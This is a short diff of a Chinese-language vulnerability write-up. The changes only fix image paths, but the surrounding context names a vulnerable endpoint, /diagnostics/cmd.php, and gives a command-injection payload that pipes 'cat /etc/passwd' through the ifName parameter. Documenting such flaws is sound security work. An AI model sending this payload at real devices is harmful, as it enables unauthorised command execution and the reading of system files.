@@ -20,7 +20,7 @@
 
 登录页面
 
-![img](./images/202202162249275.png)
+![img](images/202202162249275.png)
 
 存在漏洞的文件为 **/diagnostics/cmd.php**
 
@@ -82,4 +82,4 @@
 /diagnostics/cmd.php?action=arping&ifName=|cat /etc/passwd||
 ```
 
-![img](./images/202202162249153.png)
+![img](images/202202162249153.png)
